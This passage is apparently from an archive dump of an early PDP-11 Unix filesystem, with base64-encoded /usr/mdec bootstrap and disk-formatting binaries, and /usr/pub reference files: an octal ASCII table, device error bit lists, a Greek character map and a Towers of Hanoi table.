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
8VBn/C9B8KxPTfFQAA5PTfFQZ/zvQfCuD03xWAAOL03xWAD+703xUBAHr/oACHAKAAwhUA
IN9lgADi9M4Xfv8fCnr/3xUBAHr/AgCgAMIVAEDf5YAA4vQGA84Xfv/fFQEAev8CAB8Kev
/2VQIAAgACAKAAwgsiA/cLOPQFAgIMAgwCDAIMhwD3CWb/wgACDJ8Q5PTCZYAAnxDm9N8V
Bn/E9N8VBn/G9B8KyPTCFQBA3xUSDqgA3xUBAHr/hwCgAMIVAEDfZQAB5PTfZQAB5vTOF3
7/3xUBAHr/AgCgAIMdAgCCHQQA9wmI/8AV//8FEEUKQApFCsQVCAASEFIREhBSERIQUhES
EFIREhBSERIQUhESEFIREhBSEcQK7gLDCugCjhWOFYcAoAD3CZYEtx0CAITzgh0EAPcJNv
8ACvcLbPMBgUAKxRUgAEAKgxQDIAMDJgr3CQL0QAqDFAMgAwMmCvcJ9PNACoMUAyADAyYK
9wnm80AKgxQDIAMDJgr3CdjzxQriAkAK9wos89wCgh0EAPcJ3P63HQIAHPP3DA7zAQPFhM
UVIABSClIKUgpSCsUK+gL3CgDz9QL3C/DytwKOFY4VhwCgAIIdBAD3CaL+AAoDEEMK9wsA
/gIDwBUBAcQVEAASEBIQEhASENIQ0hDSENIQEhASEBIQEhDSENIQ0hDSEMQK7gJACkMK9w
vK/QID9wkMAPYKAgDiAo4VjhWHAMI1CAAEA8I1AAIEAwcBwjUAAgQD9wt08gSACIH3C2zy
BYDAFf//wxUBAYcAwBUBAcMV//+HAKAA9wlmAzeKTPKEHQIAgh0EAPcJBP4ACvcLOvIBgE
AKxRVAAPcLWv0CA/cJnP+DFAMgAwMmCvcJyPKDFAMgAwMmCvcJvPKDFAMgAwMmCvcJsPKD
FAMgAwMmCvcJpPJACsUK4AJACsQK2wLfNQBAeP/MArcdAgDo8YIdBAD3CZr9AAr3C9DxAY
BACsQVQADFFQQA9wvs/AID9wku/4MUAyADAyYK9wla8kAKYgqDFAMgAwMmCvcJSvJACnIK
/v/FCugCQArECuMCQAr3CpLx3QKCHQQA9wlC/YMdAgDfNQBAeP/HAvcMbvHFFSAAgBKEHA
gAEhESERIREhESEBIQEhASEMUK8wLDCu8C9wtI8QIDdwD2/o4VjhWHAKAAhB0CAIIdBAD3
CfL8AArFFSAAQArDFYAAQAoSEMMK/QLFCvgCxArzAo4VjhWHAKAA9wkcAsAV//+CHQQA9w
m+/LcdAgD+8MQVIABACsUVQACDFAMgAwMmCvcJivGDFAMgAwMmCvcJfvHFCvICxArtAkAK
9wrO8OcCgh0EAPcJfvyEHQIA9wyy8AED1oTFFQAIUgpSCsUK/ALECvgCQAr3C5jwygKOFY
4VhwCgAIQdAgCCHQQA9wlG/MAV///FFQABoQD3CVIAgxz+/wKHAyADAyYK9wkQ8cUK8wLE
Cu8CjhWOFYcAoACEHQIAgh0EAPcJDPwACsUVAAGxAPcJGgCDHP7/AoYDIAEDAInFCvUCxA
rxAo4VjhWHAEqMSoxKjEqMSoxKjEqMSoxSjEqMSoxKjEqMSoxKjEqMSoxSjIcAoACEHQIA
gh0EAPcJsvvAHaD4wxVAABIQEhASEBIQwwr6AsQK9gKOFY4VhwCgAPcJ4ADAHXz4hB0CAI
IdBAD3CX77xRVAAIMUAyADAyYK9wlW8IMUAyADAyYK9wlK8IMUAyADAyYK9wk+8IMUAyAD
AyYK9wky8MUK5gLECuIC3zUAQHj/2AL3DHLv1QKOFY4VhwCgAPcJ6O8DCgQK34tw//2Awp
dy/8JFgP/CpX8ADgL3lVwAWAB3CU7vFBOhAAQMAwyEDAMMhAwDDOgBwqUNAA8Cdwky780E
1xAAADcRMAD3CbDv/h3y/wAAzmUCAIcAtxAaAHcJEO8UE8JF+P/DDEQMwwxEDMMMRAyDUM
cBAAAAAPdF/x/o7t81AAJ4/wQD913a7truAwH3Xc7u0u7fHc7ueP/3FX9Awu7fNQAIeP8C
AzeKtu6HAA0KVE8gUkVTVE9SRSBMT0FERVJTIFNUQVJUIEFUIDIwNA0KAA0KRU5BQkxFIF
BBUklUWT8gMS8wPVlFUy9OTyAADQpTVEFSVElORyBCQU5LICMoOCk/IAANCiMgT0YgNEsg
QkFOS1MgVE8gVEVTVCg4KT8gAA0KUEFUVEVSTiAjPyAADQo/AA0KVFlQRSBDT05TVEFOVA
ANCklOUFVUICMgT0YgMjU2LiBXT1JEIEJMT0NLUyBUTyBURVNUIElOU1RFQUQgT0YADQpU
WVBFIEFERFJFU1MADQpQUk9HUkFNIEhBUyBCRUVOIFJFTE9DQVRFRCxUTyBSRVNUT1JFIF
NUQVJUIEFUIAAqAERaUU1CIERPTkUhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAwBHARf8fNxAEAHcJUPYAAAAAxhVAAd9FAIAGAt8XBgJ4/x8KCgIfCn4AXwB+AA==
-- /usr/mdec/reset mode=0100664 uid=3 gid=3 atime=174929157 mtime=174929157 base64=1 --
BwEEAAAAAAAAAAAAAAABAAUAhwA=
-- /usr/mdec/rkf mode=0100664 uid=3 gid=3 atime=174929155 mtime=174929155 base64=1 --
BwFwAAAAAAAAAAAAAAABAPUJBAByZWFkeSBkcml2ZSAwIGFuZCB0eXBlIHkKAPUJAgAmEM
AVCgDNCZcleQABA4cAxBWWAQMKwBUM/+AQ4BVuAOAVAPTgFQMMyIv+BMgLBQXDZRAAxArv
AocA9QkEAHJrZjogZXJyb3IKAIcAAAA=
-- /usr/mdec/rkuboot mode=0100664 uid=3 gid=3 atime=174929129 mtime=174929129 base64=1 --
BwG+AQAAAAAAAAAAAAABAMYVAL6BEQAKwSEKhhciBwECAsAVEAARFFcgAMD8h04AEAoGIP
2HxRWQv8AVQADNCcIVJryBEPcJ5gAXIAoACgMXIC8AAgMRkPYBgSD0A8JlDgDwAcIVJrzA
FQEANwrC/fcJSgDKCxgD9wlqAMkBwRUguoMQRBDBZRAA1AsJA9SkBwIBIfyHQBzw/8JlDg
DmAVcgILzuh+gBAgr3CTgAbQHBFSC6UhRXICC8/If2AcBlHwAFEBd0/P/3CVoAxUXw/1d1
BQDFZSC6xBUAulQVFyEYuvyHhwDOZQIAwB1E/bcKQP33NQAQGPsHAsAMABwIuhICzuUCAI
cAJgoOkACKwADADAAcCLr1A/cJCgCAFcAMABwguu4DNxAK/T0BILoA/9+LcP/9BMAdSEDA
RYD/FyBBAAWHFyBaAAKCwGUgABcgDQACAsAVCgAXIAoABQLAFQ0AzQnAFQoA94sYQP2ANx
AUQIcAgJ8AAAMDzQmOCvoBzmUCAM5FAQCHAAAKFyIHAQQCEBwQAAYg/IfmFQC+BwrbAcYB
5wHBHYr8AAoXcgwAF3QEAEBQwRUK/wkQ4R1s/+Edav/hFQUAyYv+gIcA
-- /usr/mdec/rpuboot mode=0100664 uid=3 gid=3 atime=174929133 mtime=174929133 base64=1 --
BwHIAQAAAAAAAAAAAAABAMYVAL6BEQAKwSEKhhciBwECAsAVEAARFFcgAMD8h04AEAoGIP
2HxRWQv8AVQADNCcIVJryBEPcJ5gAXIAoACgMXIC8AAgMRkPYBgSD0A8JlDgDwAcIVJrzA
FQEANwrC/fcJSgDKCxgD9wlqAMkBwRUguoMQRBDBZRAA1AsJA9SkBwIBIfyHQBzw/8JlDg
DmAVcgILzuh+gBAgr3CTgAbQHBFSC6UhRXICC8/If2AcBlHwAFEBd0/P/3CVoAxUXw/1d1
BQDFZSC6xBUAulQVFyEYuvyHhwDOZQIAwB1E/bcKQP33NQAQGPsHAsAMABwIuhICzuUCAI
cAJgoOkACKwADADAAcCLr1A/cJCgCAFcAMABwguu4DNxAK/T0BILoA/9+LcP/9BMAdSEDA
RYD/FyBBAAWHFyBaAAKCwGUgABcgDQACAsAVCgAXIAoABQLAFQ0AzQnAFQoA94sYQP2ANx
AUQIcAgJ8AAAMDzQmOCvoBzmUCAM5FAQCHAAAKFyIHAQQCEBwQAAYg/IfmFQC+BwrbAcYB
5wHBHYr8AAoXcgoAZhABEAAKF3IUAHbQAQDBFdT9iRUhEOEdYv/hHWD/4RUFAMmL/oCHAA
==
-- /usr/mdec/tboot mode=0100664 uid=3 gid=3 atime=174929140 mtime=174929140 base64=1 --
BwGGAQAAAAAAAAAAAAABAMYVAL6BEcEhC4YAChciBwECAsAVEAARFFcgAMD8h04AxRUsv8
QV4L33CVIBwBU9AM0JARH3CYQAFyAKAAwDFyBAAPcDEZAXICMA9ALB5QIARCDvh+8BCYpE
INKD9xUBAFQA9xUA6FAA9wnGAAEKQhAAEQmkAwLRi/wCCQGBEMFlQABXIAAw84f3CfIAuQ
G3HCwAIgCAHCYAgAqhAAAMAAs3EBQAAAoQCgYg/Yf3CYIA9wnKADABAAAAAAAA34tw//0E
wB2sQMBFgP8XIEEABYcXIFoAAoLAZSAAFyANAAICwBUKABcgCgAFAsAVDQDNCcAVCgD3i3
xA/YA3EHhAhwCAnwAAAwPNCY4K+gHOZQIAzkUBAIcAAAoXIgcBBAIQHBAABiD8h+YVAL4H
CtsBxgHnAcAV6P7BFeL+yRUDAMmL/gTJCwQFyC1s/w4D9gbJFQMIyYv+BMkL8AUCEsJlBQ
DCLVL/9AXpAeAdTv/gHUj/4BUFAMmL/gTJC9sFhwD3FQMIXj+HAA==
-- /usr/mdec/tcf mode=0100664 uid=3 gid=3 atime=174929152 mtime=174929152 base64=1 --
BwE+CQAAAAAAAAAAAAABAHcRNgO3ETQD9QkEAHJlYWR5IGRyaXZlIDAgYW5kIHR5cGUgeQ
oA9QkCACYQwBUKAM0JlyV5AAEDhwAACsEVPgP3CcICkRCAChcgAAL5AsAVPgfQFf//FyA+
CfuHxR3aAvUJAgD3FeAAlP/FFej+9xULAG7+9wlGAsQVIBw3CDYCQYLECvsCxBXHADcIKA
JBEMQK+wLDFUICNwgaAkEQNwgUAkgQNwgOAggSNwgIAgACNwgCAgACNwj8AQACNwj2AQAC
xBX8ADcI7AEAksQK+wI3COIBCZI3CNwBCZI3CNYBCZI3CNABCZI3CMoBAYI3CMQBQYA3CL
4BQRDDCs0CxBXHADcIsAFBEMQK+wLEFSAcNwiiAQgQxAr7AjcKxP3AFQwA9xUCCLr9t4q2
/fcJjgHACvoCwBVBAjcQ/AH3CaAB9xUPAJz99wl0AXeQkv0NEPcJdgH6AfcVDwiG/fcJXg
HEFQMBN4p4/Q0K9wlQAcQK+QI3imr9DQrAHbwB9wlgAfcJOgF3kFj9DRD3CTAB9wqmARsF
N4pI/Q0K9wkgATeKPv0NCvcJFgE3ijT9zR2IAfcJCgE3iij9DQr3CQABN4oe/Q0K9wn2AM
sBN4oS/Q0K9wn2APoBBAr3FQMABP33CdwARCM5AvcVAP/4/PcVPgf0/PcVDQDq/PcJwgCE
ChchQgLqAvcVAwDY/PcJvAAnAfcVAwjM/PcJpADECg0hIgL3FQD/vvz3FT4Huvz3FQUIsP
z3CWoA9wmEAMQL6QL3FQMInvz3CYIAEAH3CVIAxR3oAMYd5gCHAMAVAQARAcAVAQAOAcAV
AwALAcAVBAAIAcAVBQAFAcAVBgACAcAVBwD3FQEAXPzFHbAAxh2uAPUJBAB0Y2Y6IGVycm
9yCgCHACYQwBU+Bxck///iAhcgPgn6h4AVhwANFPcJAgCAAPc1gIAe/PwD1wWHAPc1gIAS
/PwDBQT3Cwj80QTOZQIAhwAEEMBFAP7ADAAcPgPAAAEKAAxBDMAMwAxBDMQAxEUB/wBdPg
OHAAIQwkXH/wMQxBUGAIMMxAr9AsNF+P/CUAMQxBUGAMMMxAr9AsNFP/7CUEIKwkUA/ocA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAA
-- /usr/mdec/tmhp mode=0100664 uid=3 gid=3 atime=174929169 mtime=174929169 base64=1 --
BwFsAQAABAIAAAAAAAABAPcJCAH1CQQAZGlzayBvZmZzZXQKAAD3CUoANxBOA/UJBAB0YX
BlIG9mZnNldAoAAPcJMAA3EDYD9QkEAGNvdW50CgAA9wkcAAIQ9wlUAPcJygC3ChgDtwoS
A8IK9gL3CaoAhwABCvUJAgAXIAoACQPA5TAAFyAJAAaCV3AKAAFg8gFAEIcA9QkEAGlsbG
VnYWwgZGlnaXQKAADWC4cAbAEA//cd+P9yAPctbADAAgcDA4L3CRgA9QH3CVAA8gHBHd7/
9wkIAMFlAAH7gYcAwBVQ9dA1AgD7AtCL+YCACtAVAP7IHTQAwBVS9cgVA2DIi/6A0AsFgM
gV///gFQtg5wH3ZQACFAC3Cg4AhwDfFQ9gUvU3CgIAhwAAAAAA1wsAAAsC3xUgAMj93xUR
AMD93xUAENr9twrm/8EdMAIAChdyFgBmEAEQAAoXchMAdtABAB8Q3P3BFcb9iRXhHUD/4R
0+/+EVMQDJi/6AhwA=
-- /usr/mdec/tmrk mode=0100664 uid=3 gid=3 atime=174929163 mtime=174929163 base64=1 --
BwFEAQAABAIAAAAAAAABAPcJCAH1CQQAZGlzayBvZmZzZXQKAAD3CUoANxAmA/UJBAB0YX
BlIG9mZnNldAoAAPcJMAA3EA4D9QkEAGNvdW50CgAA9wkcAAIQ9wlUAPcJygC3CvACtwrq
AsIK9gL3CaoAhwABCvUJAgAXIAoACQPA5TAAFyAJAAaCV3AKAAFg8gFAEIcA9QkEAGlsbG
VnYWwgZGlnaXQKAADWC4cARAEA//cd+P9yAPctbACYAgcDA4L3CRgA9QH3CVAA8gHBHd7/
9wkIAMFlAAH7gYcAwBVQ9dA1AgD7AtCL+YCACtAVAP7IHTQAwBVS9cgVA2DIi/6A0AsFgM
gV///gFQtg5wH3ZQACFAC3Cg4AhwDfFQ9gUvU3CgIAhwAAAAAAwR0kAgAKF3IMABd0BABA
UMEVCv8JEOEdaP/hHWb/4RUDAMmL/oCHAA==
-- /usr/mdec/tmrp mode=0100664 uid=3 gid=3 atime=174929166 mtime=174929166 base64=1 --
BwFOAQAABAIAAAAAAAABAPcJCAH1CQQAZGlzayBvZmZzZXQKAAD3CUoANxAwA/UJBAB0YX
BlIG9mZnNldAoAAPcJMAA3EBgD9QkEAGNvdW50CgAA9wkcAAIQ9wlUAPcJygC3CvoCtwr0
AsIK9gL3CaoAhwABCvUJAgAXIAoACQPA5TAAFyAJAAaCV3AKAAFg8gFAEIcA9QkEAGlsbG
VnYWwgZGlnaXQKAADWC4cATgEA//cd+P9yAPctbACiAgcDA4L3CRgA9QH3CVAA8gHBHd7/
9wkIAMFlAAH7gYcAwBVQ9dA1AgD7AtCL+YCACtAVAP7IHTQAwBVS9cgVA2DIi/6A0AsFgM
gV///gFQtg5wH3ZQACFAC3Cg4AhwDfFQ9gUvU3CgIAhwAAAAAAwR0uAgAKF3IKAGYQARAA
ChdyFAB20AEAwRXU/YkVIRDhHV7/4R1c/+EVAwDJi/6AhwA=
-- /usr/mdec/uboot mode=0100664 uid=3 gid=3 atime=170471874 mtime=173058176 base64=1 --
BwHwAQAAAAAAAAAAAAABAMYVAL6BEcEhDIYFAAAKFyIHAQICwBUQABEUVyDwv/yHTgDAFQ
C6EAoGIP2H9wlmARcgawADAsAVcr8FARcgcADwAsAVWL83ENr9wBUKAPcJcAHBFSa8QhD3
CToBFyAKAAoDFyAvAAIDEpD2AUIg9APBZQ4A8AHBFSa8wBUBADcKoP33CWAAyQsYA/cJgA
C4AcIVILpDEIQQwmUQANQLCQPUpAcCAiH8h4Ac8P/BZQ4A5gGXICC87ofoAQEK9wlOAAcB
whUgupEUlyAgvPyH9gEAChciBwEEAhAcEAAGIPyH3wkAAI0BwGUfAAUQF3T8//cJWgDFRf
D/V3UFAMVlILrEFQC6VBUXIRi6/IeHAM5lAgDAHQz9twoI/fc1ABDg+gcCwAwAHAi6EgLO
5QIAhwAmCg6QAIrAAMAMABwIuvUD9wkKAIAVwAwAHCC67gNmEAEQAAp/AMz8F3IKAGYQAR
AAChdyFAB20AEAwRXU/YkVBwEXcgwAF3QEAEBQwRUM/yEQ4RUguuEVAP/hFQUAyYv+BIEV
hwDAFXD/iArIi/4EwB3OP8BFgP8XIEEABYcXIFoAAoLAZSAAFyANAAICwBUKAPeLrj/9BB
cgCgAOAsAVDQD3Cez/wBWKAPcJ5P8ACvcJ3v/AFQoAhwA3EIg/hwA=
-- /usr/pub mode=0140775 uid=3 gid=3 atime=174843156 mtime=169258830 --
-- /usr/pub/ascii mode=0100664 uid=3 gid=3 atime=169848969 mtime=169259754 --
|000 nul|001 soh|002 stx|003 etx|004 eot|005 enq|006 ack|007 bel|
|010 bs |011 ht |012 nl |013 vt |014 np |015 cr |016 so |017 si |
|020 dle|021 dc1|022 dc2|023 dc3|024 dc4|025 nak|026 syn|027 etb|
|030 can|031 em |032 sub|033 esc|034 fs |035 gs |036 rs |037 us |
|040 sp |041  ! |042  " |043  # |044  $ |045  % |046  & |047  ' |
|050  ( |051  ) |052  * |053  + |054  , |055  - |056  . |057  / |
|060  0 |061  1 |062  2 |063  3 |064  4 |065  5 |066  6 |067  7 |
|070  8 |071  9 |072  : |073  ; |074  < |075  = |076  > |077  ? |
|100  @ |101  A |102  B |103  C |104  D |105  E |106  F |107  G |
|110  H |111  I |112  J |113  K |114  L |115  M |116  N |117  O |
|120  P |121  Q |122  R |123  S |124  T |125  U |126  V |127  W |
|130  X |131  Y |132  Z |133  [ |134  \ |135  ] |136  ^ |137  _ |
|140  ` |141  a |142  b |143  c |144  d |145  e |146  f |147  g |
|150  h |151  i |152  j |153  k |154  l |155  m |156  n |157  o |
|160  p |161  q |162  r |163  s |164  t |165  u |166  v |167  w |
|170  x |171  y |172  z |173  { |174  | |175  } |176  ~ |177 del|
-- /usr/pub/deverr mode=0100664 uid=3 gid=3 atime=169848972 mtime=169259754 --
0/1 RF0
100000 - error
040000 - freeze
020000 - write check error
010000 - data parity error
004000 - non-existent disk
002000 - write lock out
001000 - missed transfer
000400 - disk clear
000200 - control ready
000100 - interrupt enable
000040 - extend memory
000020 - extend memory
000010 - maintenance
000004 - function
000002 - function
000001 - go

1/n - RKn
100000 - drive error
040000 - overrun
020000 - write violation
010000 - seek error
004000 - programming error
002000 - non-existent memory
001000 - data late
000400 - timing error
000200 - non-existent disk
000100 - non-existent cylinder
000040 - non-existent sector
000020 -
000010 -
000004 -
000002 - checksum error
000001 - write check error

2/n TCn
100000 - end zone
040000 - parity error
020000 - mark track error
010000 - illegal operation
004000 - selection error
002000 - block missed
001000 - data missed
000400 - non-existent memory
000200 - tape is up to speed
000100 - clock simulates timing
000040 - maintenance mark track
000020 - data track
000010 - data track
000004 - data track
000002 - extended data
000001 - extended data

3/n MTn - no messages

4/n RPn
100000 - write protect violation
040000 - file unsafe violation
020000 - non-existent cylinder
010000 - non-existent track
004000 - non-existent sector
002000 - program error
001000 - format error
000400 - mode error
000200 - longitudinal parity error
000100 - word parity error
000040 - checksum error
000020 - timing error
000010 - write check error
000004 - non-existent memory
000002 - end of pack
000001 - disk error
-- /usr/pub/greek mode=0100664 uid=3 gid=3 atime=169848974 mtime=169259754 --
alpha	A  A  |  beta	B  B  |  gamma	\  \
GAMMA	G  G  |  delta	D  D  |  DELTA	W  W
epsilon	S  S  |  zeta	Q  Q  |  eta	N  N
THETA	T  T  |  theta	O  O  |  lambda	L  L
LAMBDA	E  E  |  mu	M  M  |  nu	@  @
xi	X  X  |  pi	J  J  |  PI	P  P
rho	K  K  |  sigma	Y  Y  |  SIGMA	R  R
tau	I  I  |  phi	U  U  |  PHI	F  F
psi	V  V  |  PSI	H  H  |  omega	C  C
OMEGA	Z  Z  |  nabla	[  [  |  not	_  _
partial	]  ]  |  integral  ^  ^
-- /usr/pub/hanoi mode=0100664 uid=3 gid=3 atime=169848976 mtime=169259754 --






1	      4		    6		  4		5

2	      1		    1		  1		1

3	      2		    2		  2		2

4	      3		    3		  3		3

5	      5		    4		  6		4

6	      1		    1		  1		1

7	      2		    2		  2		2

8	      3		    3		  3		3

9	      4		    5		  4		6

1	      1		    1		  1		1

2	      2		    2		  2		2

3	      3		    3		  3		3

4	      7		    4		  5		4

1	      1		    1		  1		1

2	      2		    2		  2		2

3	      3		    3		  3		3

5	      4		    8		  4		5

1	      1		    1		  1		1

2	      2		    2		  2		2

3	      3		    3		  3		3

4	      5		    4		  7		4

1	      1		    1		  1		1

2	      2		    2		  2		2

3	      3		    3		  3		3

6	      4		    5		  4		9

